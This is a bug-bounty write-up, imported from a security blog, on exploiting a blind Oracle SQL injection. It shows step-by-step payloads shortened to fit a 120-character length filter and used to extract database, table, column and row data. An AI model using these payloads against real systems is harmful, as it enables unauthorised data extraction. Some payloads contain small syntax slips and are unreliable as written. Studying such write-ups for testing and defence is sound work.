---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-23_defeating-length-filters-to-dump-the-database-sqli.md
original_filename: 2024-02-23_defeating-length-filters-to-dump-the-database-sqli.md
title: Defeating Length Filters to Dump the Database - SQLi
category: documents
detected_topics:
- rate-limit
- sqli
- idor
- command-injection
- automation-abuse
tags:
- imported
- documents
- rate-limit
- sqli
- idor
- command-injection
- automation-abuse
language: en
raw_sha256: 007f14f6599e2507a92a2e999f825b12cad59b3c7919962d1541747796c2fc87
text_sha256: 90d33e27f42a6b162e366e1cffdfb2291c9ea4cbef352cd8d8f5633b41c11c2d
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: false
---

# Defeating Length Filters to Dump the Database - SQLi

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-23_defeating-length-filters-to-dump-the-database-sqli.md
- Source Type: markdown
- Detected Topics: rate-limit, sqli, idor, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: False
- Raw SHA256: `007f14f6599e2507a92a2e999f825b12cad59b3c7919962d1541747796c2fc87`
- Text SHA256: `90d33e27f42a6b162e366e1cffdfb2291c9ea4cbef352cd8d8f5633b41c11c2d`


## Content

---
title: "Defeating Length Filters to Dump the Database - SQLi"
page_title: "Defeating Length Filters to Dump the Database - SQLi :: kuldeepdotexe's blog"
url: "https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/"
final_url: "https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/"
authors: ["Kuldeep Pandya (@kuldeepdotexe)"]
bugs: ["SQL injection"]
publication_date: "2024-02-23"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 411
---

Hello, hackers!

Most SQL injections I find are very trivial and do not require a separate blog post.

However, this particular SQL injection was far from being straightforward. It required me to work more than 13 hours to successfully dump the database. Although some of the tricks that I used for this SQL injection are not new and can be found with a bit of Google search, I learned them the hard way.

This blog post aims to share with the community what I learned along the way. I will cover my entire thought process and journey from detection to full exploitation of the SQL injection. I hope this walkthrough will be helpful to someone who encounters a similar challenge.

For convenience’s sake, this blog will be organized into sections.

  1. [Discovery](/posts/defeating-length-filters-to-dump-the-database-sqli/#discovery)
  2. [Running SQLMap And Discovering The Balanced Query](/posts/defeating-length-filters-to-dump-the-database-sqli/#running-sqlmap-and-discovering-the-balanced-query)
  3. [Discovering Length Filter](/posts/defeating-length-filters-to-dump-the-database-sqli/#discovering-length-filter)
  4. [Dumping The Database Name](/posts/defeating-length-filters-to-dump-the-database-sqli/#dumping-the-database-name)
  5. [Dumping The Table Name](/posts/defeating-length-filters-to-dump-the-database-sqli/#dumping-the-table-name)
  6. [Finding A Way To Use Limits And Offsets](/posts/defeating-length-filters-to-dump-the-database-sqli/#finding-a-way-to-use-limits-and-offsets)
  7. [Finding The Shortest Possible Payload](/posts/defeating-length-filters-to-dump-the-database-sqli/#finding-the-shortest-possible-payload)
  8. [Successfully Dumping Table Names](/posts/defeating-length-filters-to-dump-the-database-sqli/#successfully-dumping-table-names)
  9. [Guessing Column Names](/posts/defeating-length-filters-to-dump-the-database-sqli/#guessing-column-names)
  10. [Dumping The Rows](/posts/defeating-length-filters-to-dump-the-database-sqli/#dumping-the-rows)

Strap in for an in-depth look at SQL injections and the methods used.

### Discovery⌗

A new target was onboarded to me on the Synack Red Team platform. However, it was an old target launched under a new name. No surprise there.

While this target was previously onboarded, I sent a few SQLis. Because of this, I was certain that I could find more SQLis this time.

As usual, I browsed the application like a normal user and checked the requests that the application sent. I tested each request manually for SQL injections.

The “manual testing” part for me is mostly injecting special characters into different parameters and observing the behavior of the application.

While testing for SQL injection on a particular request, I noticed the following behavior:

Payload | Response Length  
---|---  
| 422k Bytes  
' | 33k Bytes  
‘– - | 33k Bytes  
‘)– - | 422k Bytes  
  
Note: The first value is nothing. It is the normal response the application would send.

This was intriguing behavior. It looked like a potential SQL injection. I tried a few more SQLi payloads, but I couldn’t find the right payload for it.

### Running SQLMap And Discovering The Balanced Query⌗

To find the correct query, I sent the request to [SQLMap](https://github.com/sqlmapproject/sqlmap). SQLMap successfully discovered the SQL injection and gave me the query that would give me a boolean response.

It gave me the following payload:
  
  
  123' AND (SELECT (CASE WHEN (4747=4747) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4747) END) FROM DUAL) IS NULL OR 'iTjZ'='tEus
  

### Payload Explanation⌗

  1. `SELECT (...) FROM DUAL`: This is just a simple `SELECT` query that encapsulates the underlying `CASE...WHEN` statement.
  2. `CASE WHEN (condition) THEN <true statement> ELSE <false statement> END`: This section is the most important as `CASE...WHEN` will execute a `true` or `false` statement based on the condition. It is similar to the classic `if…else` in different programming languages.
  3. `4747=4747`: This is an always true condition as 4747 is always equal to 4747.
  4. `CTXSYS.DRITHSX.SN(1,4747)`: This is a function call to an internal Oracle DBMS function. I could not find much documentation about the function. But in this payload, this function should respond with an error message.

So, the payload checks if 4747 is equal to 4747 (which is true) then it selects `NULL` and compares `NULL` with `NULL` (which is also true). This will result in a true response.

If we wanted to receive a false response, we would replace `4747=4747` with `4747=4848`.

I now had a working payload. I tried to enumerate the databases using SQLMap. However, SQLMap failed to enumerate the databases.

I was not surprised by this behavior because, during my initial enumeration, I noticed that the server correctly filtered out some characters. These characters included but were not limited to the following:

  * `"`
  * `#`
  * 

Due to these character filters, SQLMap was unable to enumerate the databases. I decided to do the database dumping by hand.

I simplified the SQLMap’s payload to the following:
  
  
  123' AND (
  SELECT (
  CASE
  WHEN (1=1) THEN NULL
  ELSE 1/0
  END
  ) FROM DUAL
  ) IS NULL OR '1'='1
  

### Discovering Length Filter⌗

After doing a little back and forth with the payloads, I realized that some payloads were not acting as they should be.

For example, the following payload resulted in a `302 Found` response rather than a `200 OK` response:
  
  
  123' AND (
  SELECT (
  CASE
  WHEN (12345678901234567890=12345678901234567890) THEN NULL
  ELSE 1/0
  END
  ) FROM DUAL
  ) IS NULL OR '1'='1
  

Although they are both the same numbers, the server was resulting in a `302 Found` response. Usually, the server responded in a `302 Found` response when we sent a character that the server was filtering.

However, we did not send any bad characters in this payload. The `1=1` payload was found to be working previously.

I changed the condition from `12345678901234567890=12345678901234567890` to `1234567890=1234567890` and the server returned `200 OK` with a `true` response.

This was evident that something weird happened when we sent a large payload. There must be some sort of length filter on the backend that prevents us from sending long payloads.

After adding one character at a time, I figured out that if we send any more characters than **120** , the server would not process the request and we would receive a `302 Found` response. Whatever payload we use must be less than or equal to 120 characters.

I tried to see ways in which I could shorten the payload. I learned that we can replace `NULL` with `1` in the payload and it will work just fine. The resulting _shorter_ payload was:
  
  
  ' AND (
  SELECT (
  CASE
  WHEN (1=1) THEN 1
  ELSE 1/0
  END
  ) FROM DUAL
  )=1 OR '1'='1
  

We moved from requiring 86 characters to 74 characters! Excellent!

I suspected that the `SELECT` statement around the `CASE...WHEN` statement was necessary. I tried removing it and it turns out that it was optional! We can directly use `CASE...WHEN` without wrapping it using `SELECT`. Our payload was even shorter now.
  
  
  ' AND (
  CASE
  WHEN (1=2) THEN 1
  ELSE 1/0
  END
  )=1 OR '1'='1
  

This payload was merely 55 characters long!

### Dumping The Database Name⌗

It was now time to enumerate the database names. My strategy to dump the database name was as follows:

  1. Find out the length of the current database name. We will refer to the length of the database as `len`.
  2. Use a substring payload where the `SUBSTR()` function starts from the first character of the database and goes till `len`.
  3. Enumerate one character at a time.

To determine the database length, I used the following payload:
  
  
  ' AND (
  CASE
  WHEN ((SELECT LENGTH(SYS.DATABASE_NAME) FROM DUAL)>0) THEN 1
  ELSE 1/0
  END
  )=1 OR '1'='1
  

The above payload checks if the length of the current database name is greater than 0. This is true for any database name. Hence, we get a `true` response.

By increasing one number at a time, we get to know that the database name is exactly **6** characters long.

To dump the database name, I used a `SUBSTR()` payload that looks like this:
  
  
  ' AND (
  CASE
  WHEN ((SELECT ASCII(SUBSTR(SYS.DATABASE_NAME,1,1)) FROM DUAL)>0) THEN 1
  ELSE 1/0
  END
  )=1 OR '1'='1
  

### Payload Explanation⌗

  1. `SUBSTR(SYS.DATABASE_NAME,1,1)`: This part returns the very first character of the database name.
  2. `ASCII(...)`: This function converts the first character of the database name to its corresponding ASCII value.
  3. `ASCII(SUBSTR(...))>0`: This part checks if the ASCII value of the first character is greater than 0 (which is always true unless the server uses Unicode database names).

In theory, we can keep increasing from `0` to up to `127`. However, valid database names start after `45` (ASCII value of `-`) and go up to `122` (ASCII value of lowercase `z`).

I did the brute force for each character and found out the database name to be “**SYNACK** ” (obviously fake because I will not reveal client details).

### Dumping The Table Name⌗

Now that we know the database name, it was our turn to dump the table names. Using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md), I came across the following query:
  
  
  SELECT table_name FROM all_tables
  

However, this query would return multiple rows in the response. Using our technique, we can only dump one row and one column, one character at a time. It is very slow but this is the best that we have got.

Following the PayloadsAllTheThings page, I knew that we could use the `ROWNUM` pseudo-column to filter from the number of rows returned by the query. Incorporating this into our payload, this was our payload that finds the length of the first table from the `all_tables` view:
  
  
  ' AND (
  CASE
  WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables WHERE ROWNUM=1)=0) THEN 1
  ELSE 1/0
  END
  )=1 OR '1'='1
  

Increasing the number, I found out that the table was **4** characters long.

After using a `SUBSTR()` payload, I discovered the table name was “**DUAL** ”. :/ For a practical proof-of-concept, we will need a table that is not a system table. It should contain some client data.

I changed from `ROWNUM=1` to `ROWNUM=2` in the hope that it would give me the next row. However, in Oracle, the `ROWNUM` pseudo-column works in an unexpected way. We cannot directly provide a row number apart from `ROWNUM=1`.

### Finding A Way To Use Limits And Offsets⌗

We had to find a different solution that would limit the number of rows returned by the SQL query. MySQL has `LIMIT` and `OFFSET` statements that can be used to limit the number of rows. I knew a little about Oracle limits. Upon doing further Google searches, I found out that we need to use `OFFSET...FETCH` statements if we wish to limit the results.

An example usage would be like this:
  
  
  ' AND (
  CASE
  WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=0) THEN 1
  ELSE 1/0
  END
  )=1 OR '1'='1
  

However, this payload would exceed our maximum limit of 120 characters. :(

### Finding The Shortest Possible Payload⌗

I shifted my focus toward crafting the shortest payload that would give me a boolean response. I played around with the payload a bit and I discovered that in some places, spaces were optional. We could eliminate spaces!

For example, consider the following `CASE...WHEN` payload
  
  
  CASE WHEN (1=1) THEN 1 ELSE 1/0 END -- 35 characters
  

This can be rewritten to eliminate spaces like this:
  
  
  CASE WHEN(1=1)THEN 1ELSE 1/0END -- 31 characters
  

Considering this in mind, I crafted the shortest possible payload that provided me with a boolean response as:
  
  
  'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1 -- 47 characters
  

By doing this, we effectively moved from 86 characters to 47 characters. This was a massive improvement!

### Successfully Dumping Table Names⌗

With our refined payload and using offsets, I went on to dump the table names. I skipped the first table that was “DUAL” and started dumping the second table name. To do this, I used the following payload:
  
  
  'AND(CASE WHEN((SELECT table_name FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)>'A')THEN 1ELSE 1/0END)=1OR'1'='1 -- 120 characters
  

Using this payload, I dumped the first three characters from the table name that was “**SYS** ”. After dumping the third character, the payload becomes exactly 120 characters long and we cannot dump any further.

I found a workaround for this by using the `LIKE` statement and eliminating offsets and limits. Here is the payload that I used:
  
  
  'AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE 'SYS_______')>0)THEN 1ELSE 1/0END)=1OR'1'='1 -- 114 characters
  

Enumerating the table name one character at a time, I found that the table name was “**SYSTEMTBL$** ”. I could not enumerate the last $ character because it was a bad character. However, I googled the table name and found out that it was also a system table and the table name ended with a $.

I tried to play around with the offset values to enumerate more table names but almost all of them turned out to be system tables.

To find a table that was not a system table, I did some guesswork. As I mentioned earlier in the blog, this application was a retest. I had already sent plenty of SQLis on this application. Due to this, I was fortunate enough to know the naming convention of the tables. I knew the table names had the following prefix: “**SYN_** ”.

I crafted a payload to check for tables that had the “**SYN_** ” prefix. The payload looked like this:
  
  
  'AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE 'SYN____')=1)THEN 1ELSE 1/0END)=1OR'1'='1 -- 111 characters
  

This payload was successful and I enumerated the table name to be “**SYN_NEW** ”.

### Guessing Column Names⌗

Next up, we had to enumerate the column names from the “SYN_NEW” table. For this, I tried to craft a payload like this:
  
  
  'AND(CASE WHEN((SELECT OWNER FROM all_tab_columns WHERE table_name='SYN_NEW'ANDROWNUM=1)>0)THEN 1ELSE 1/0END)=1OR'1'='1 -- 119 characters
  

However, this payload would not work. The `(SELECT OWNER FROM all_tab_columns WHERE table_name='SYN_NEW'ANDROWNUM=1)` subquery returns a string and we must compare it with a string to get a meaningful result. Even if we try to compare it with the ASCII value of the first character, we would be limited to enumerating the first character of the column name. We had just enough space to fit a single character.

I could not think of anything from here. So, I decided to brute force the column names. To perform the brute force, I used the following payload:
  
  
  'AND(CASE WHEN((SELECT LENGTH(§test§) FROM SYN_NEW OFFSET 1ROWS FETCH NEXT 1ROWS ONLY)>0)THEN 1ELSE 1/0END)=1OR'1'='1 -- 115 characters
  

I brute-forced using the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) wordlist.

And quickly enough, I found one column “**user** ”.

### Dumping The Rows⌗

From here, the database dump was quite easy, I just used the following payload to dump one row at a time:
  
  
  'AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)>'SYN')THEN 1ELSE 1/0END)=1OR'1'=' -- 108 characters
  

I enumerated the first row to be “**SYN_WAS** ”. To confirm that what we dumped was indeed a valid row and was not a fluke, I used the following payload:
  
  
  'AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)='SYN_WAS')THEN 1ELSE 1/0END)=1OR'1'=' -- 112 characters
  

If you change from “**SYN_WAS** ” to something else like “**SYN_WAR** ”, the application will send a false response. Confirming that our row dump is valid.

Sent the report to Synack and they happily accepted the findings!

### Takeaways⌗

  1. Keep taking notes of your vulnerabilities. You never know when they will become useful.
  2. Bug bounties are often luck paired with hard work. If I had not found the SQL injections on this target in the past, I would never have guessed what naming structure the table names follow.

I love doing technical discussions with the community! If you have a question about anything related to infosec, feel free to send me a DM on my [Twitter](https://twitter.com/kuldeepdotexe)/[Instagram](https://www.instagram.com/kuldeepdotexe)/[LinkedIn](https://www.linkedin.com/in/kuldeep-pandya-13a26a167/).

EOF
